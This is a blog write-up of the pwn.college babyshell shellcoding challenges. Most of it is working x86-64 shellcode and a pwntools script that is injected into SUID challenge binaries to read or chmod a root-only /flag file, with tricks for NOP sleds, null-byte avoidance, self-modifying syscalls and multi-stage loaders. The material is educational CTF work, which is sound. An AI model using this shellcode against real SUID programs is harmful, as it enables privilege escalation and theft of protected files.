---
title: "Notes of pwn.college babyshell&sandboxing levels"
date: "2022-01-16"
author: "uoft-flyfreejay"
description: "short notes for pwn.college dojo's shellcoding exercises"
---

# Intro

So, here we go with the shellcoding modules. 

In these challenges, my goals are to read the contents of the `/flag` file. That file is only readable as a root. We will have to inject shellcodes into the binaries located under each `/challenge` folder to read the `/flag` using the SUID of the challenge binary. Of course, to make things more interesting each challenge will have their own special constraints. Let's get hacking!

## babyshell

### level1

- Referece: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

The very first level. Running `ls -al` in the `/challenge` directory reveals that the binary in the folder has SUID bit set. Constructing the shellcode:

```python
import pwn
import time

pwn.context.arch = "amd64"
pwn.context.encoding = "latin"
pwn.context.log_level = "INFO"
pwn.warnings.simplefilter("ignore")

assembly = r'''
.global _start
.intel_syntax noprefix
_start:
    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
    syscall
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    mov rax, 0
    syscall
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
    syscall
    mov rax, 60
    syscall
flag:
    .ascii "/flag\0"
'''

with pwn.process(f"/challenge/{pwn.os.getenv('HOSTNAME')}") as target:
    pwn.info(target.readrepeat(1))

    target.send(pwn.asm(assembly))
    pwn.info(target.readrepeat(1))
```

I wrapped the shellcode in python and used `pwntools` to send it to the binary. This code will be the default template for the future challenges. We use set `rax` to be 2 to open the `/flag`. We then store the returned FD into `rdi` and set `rax` to 0 to write to STDOUT. Lastly, we will set `rax` to 1 to read. 

### level2

This level has a new constraint. The program can skip upto 0x800 bytes from our shellcode. The hint was that we can use a simple 1 byte instruction to fill up the space, such as `nop`. This is called `nop sleding`. I will only post the shellcode from now.

```asm
.global _start
.intel_syntax noprefix
_start:
    .rept 0x800
    nop
    .endr
    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
    syscall
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    mov rax, 0
    syscall
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
    syscall
    mov rax, 60
    syscall
flag:
    .ascii "/flag\0"
```

### level3

- Reference: https://www.youtube.com/watch?v=QYlJd_0hRmI&list=PL-ymxv0nOtqrx3u1ZH3J9keH1ZgK8wJXF&index=7

This level requires us not to have any `00` byte in our shellcode. Using `xor` trick to zero out the bits is the technique I used the most often. The hardest part was moving `/flag\0` characters into `rdi`. I referred to the office hour videos for that. What he did was building the string character by character in the stack. 

```asm
.global _start
.intel_syntax noprefix
_start:
    xor rax, rax
    mov al, 2
    mov byte ptr [rsp], '/'
    mov byte ptr [rsp+1], 'f'
    mov byte ptr [rsp+2], 'l'
    mov byte ptr [rsp+3], 'a'
    mov byte ptr [rsp+4], 'g'
    xor cl, cl
    mov byte ptr [rsp+5], cl
    mov rdi, rsp
    xor rsi, rsi
    syscall
    mov rdi, rax
    mov rsi, rsp
    xor rdx, rdx
    mov dl, 100
    xor rax, rax
    syscall
    xor rdi, rdi
    mov dil, 1
    mov rsi, rsp
    mov rdx, rax
    xor rax, rax
    mov al, 1
    syscall
    xor rax, rax
    mov al, 60
    syscall
```

# level4

- Credit: Thank you `connojd`!

This level requires me not to use any H-bytes, meaning no 64-bit operations. Well for the most parts, that's easy, we can just use 32-bit registers. However, carrying the `/flag\0` string around was the hardest part here. A nice fella on Discord helped me out greatly on this one. I just pushed necessary char bytes to the stack, and used `push rsp`, `pop REG` consecutively to imitate `mov REG, rsp`. Here `REG` is any 64-bit register you want. 

```
.global _start
.intel_syntax noprefix
_start:
    mov eax, 2
    mov cx, 0x0067
    push cx
    mov cx, 0x616c
    push cx
    mov cx, 0x662f
    push cx
    push rsp
    pop rdi
    mov esi, 0
    syscall
    mov edi, eax
    push rsp
    pop rsi
    mov edx, 100
    mov eax, 0
    syscall
    mov edi, 1
    push rsp
    pop rsi
    mov edx, eax
    mov eax, 1
    syscall
    mov eax, 60
    syscall
```

### level5

This level we cannot directly have `syscall` or `int` in our assembly, which gets translated to the according bytes. We can however modify the bytes in place during the runtime to get those bytes. 

```asm
.global _start
.intel_syntax noprefix
_start:
    mov byte ptr [rip + syscall1], 0x0f
    mov byte ptr [rip + syscall1 + 1], 0x05
    mov byte ptr [rip + syscall2], 0x0f
    mov byte ptr [rip + syscall2 + 1], 0x05
    mov byte ptr [rip + syscall3], 0x0f
    mov byte ptr [rip + syscall3 + 1], 0x05
    mov byte ptr [rip + syscall4], 0x0f
    mov byte ptr [rip + syscall4 + 1], 0x05

    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
syscall1:
    .byte 0x00
    .byte 0x00
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    mov rax, 0
syscall2:
    .byte 0x00
    .byte 0x00
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
syscall3:
    .byte 0x00
    .byte 0x00
    mov rax, 60
syscall4:
    .byte 0x00
    .byte 0x00
flag:
    .ascii "/flag\0"
```

### level6

Oh no! I won't have a read&write permissions in the first 4096 bytes of my shellcode! Well, then I will start my shellcode after 4096 bytes lol. I will fill the first 4096 bytes with 1-byte instruction, `nop` that does not do anything. Other than that, since this level shares the same constraints as `level5`, I will reuse the shellcode from `level5`. 

Add this on top:

```asm
.rept 4096
nop
.endr
```

### level7

This level limits my use of `stdin`, `stderr`, and `stdout`. More specifically, it will close the file descriptors 0-2. However, I can still use `sendfile` to transfer the datas of our flag file into one of my files. I named my file `~/meow` because I love cats. I will open `meow` in a similar way but with `rsi` set to 1, for write. Before I open my second file, `meow`, I will also push the file descriptor of opened `/flag` onto the stack for `sendfile`. 

```asm
    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
    syscall
    push rax
    mov rax, 2
    lea rdi, [rip + meow]
    mov rsi, 1
    syscall
    mov rdi, rax
    pop rsi
    mov rdx, 0
    mov r10, 1000
    mov rax, 40
    syscall
    mov rax, 60
    syscall
flag:
    .ascii "/flag\0"
meow:
    .ascii "/home/hacker/meow\0"
```

### level8

This level is similar to `level6`, but now it only takes `0x12` bytes of shellcode. This means that I will barely have a space to make one syscall. Looking through the discord channel for pwn.college revealed that the key was to use `chmod` and symlinks. I will first create a symbolic link to `/flag` called `f` in my home directory, more specifically the directory where I will run the challenge binary. Then I will change the `f`'s permission to `7`, which is read-write-exec for me. 

```asm
.global _start
.intel_syntax noprefix
_start:
    mov al, 90
    mov word ptr [rsp], 0x0066
    mov rdi, rsp
    mov sil, 7
    syscall
```

### level9

This level will replace every other 10 bytes with `0xcc`, which is a system call for debugger resulting in a pause of execution. To keep my shellcode short, I decided to reuse the idea from `level8`. To avoid the debugger call, I can first put `nop` calls on the locations where the bytes will be replaced and simply jump over them with `jmp`. 

```asm
    mov word ptr [rsp], 0x0066
    jmp skip
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
skip:
    mov al, 90
    mov rdi, rsp
    mov sil, 7
    syscall
```

### level10

This level will sort my shellcode. Thing is tho... using the code from `level9` still worked here too since the code was already somehow sorted. That made my life easier!

### level11

The constraints are same as `level10`

### level12

This challenge requires my shellcodes' bytes to be all unique. My original `chmod` code failed, so investigating the bytes with `objdump` showed me that there were 2 `66` bytes. One of them was inevitable as it was an ascii character that represents `f`. Doing a little experiment and using `push` got rid of the other `66` byte.

```asm
    push 0x0066
    mov al, 90
    mov rdi, rsp
    mov sil, 7
    syscall
```

### level13

This challenge will only take in `0xc` bytes of shellcode now! Which are only 12 bytes. But again, my `chmod` shellcode was already extremely short and I passed through it easily.

### level14

Last level! Now it will only take in `6` bytes of shellcode. No syscall can fit into such small number of bytes. This calls for a `multi-stage` shellcode. We will inject another shellcode that does the dirty deeds after the first one. Using `gdb` shows that `rax` is set to 0 when the shellcode is ran. Using this fact, we can reduce the length of our first shellcode to this:

```asm
    push rdx
    pop rsi
    xor edi, edi
    syscall
```

This will call `read` and we will read in the bytes of our shellcode that actually changes the permissino on `/flag` like we always did. I won't get into the specifics here and leave the rest to the readers as a challenge.
